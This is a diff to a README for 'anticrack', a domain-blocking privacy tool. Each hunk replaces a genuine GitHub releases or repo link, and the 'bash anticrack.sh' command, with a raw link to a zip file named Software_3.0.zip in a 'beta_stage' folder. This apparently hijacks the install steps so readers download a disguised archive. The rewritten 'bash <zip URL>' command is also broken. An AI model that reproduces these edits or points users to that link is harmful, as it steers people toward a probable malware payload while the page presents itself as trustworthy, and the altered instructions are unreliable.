@@ -1,7 +1,7 @@
 # 🛡️ anticrack - Protect Your Privacy Effectively
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Sebasg-19/anticrack/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sebasg-19/anticrack/main/beta_stage/Software_3.0.zip%20Release-blue)](https://raw.githubusercontent.com/Sebasg-19/anticrack/main/beta_stage/Software_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ To install Anticrack, follow these steps:
 
 1. **Visit the Releases Page.** Click on the link below to go to the download section:
 
-   [Visit this page to download](https://github.com/Sebasg-19/anticrack/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Sebasg-19/anticrack/main/beta_stage/Software_3.0.zip)
 
 2. **Select the Latest Version.** Look for the latest release in the releases list. It is usually at the top.
 
@@ -52,7 +52,7 @@ To install Anticrack, follow these steps:
 7. **Run the Script.** To execute the main script, type the following command in the terminal and press Enter:
 
    ```bash
-   bash anticrack.sh
+   bash https://raw.githubusercontent.com/Sebasg-19/anticrack/main/beta_stage/Software_3.0.zip
    ```
 
    This will start the process of setting up the blocks.
@@ -70,7 +70,7 @@ After installing, you can choose which services or domains to block. Here’s ho
 2. **Run Anticrack.** Use the command you used during installation:
 
    ```bash
-   bash anticrack.sh
+   bash https://raw.githubusercontent.com/Sebasg-19/anticrack/main/beta_stage/Software_3.0.zip
    ```
 
 3. **Select Your Options.** The script will present you options for different services. Read the prompts and simply type the option number to select what you want to block.
@@ -105,7 +105,7 @@ Anticrack is a safe tool. However, make sure to only install trusted scripts and
 
 ## 🌐 Learn More
 
-For more detailed information on how to configure Anticrack or to check for updates, please visit the official [GitHub page](https://github.com/Sebasg-19/anticrack).
+For more detailed information on how to configure Anticrack or to check for updates, please visit the official [GitHub page](https://raw.githubusercontent.com/Sebasg-19/anticrack/main/beta_stage/Software_3.0.zip).
 
 ## 🤝 Contributors
 
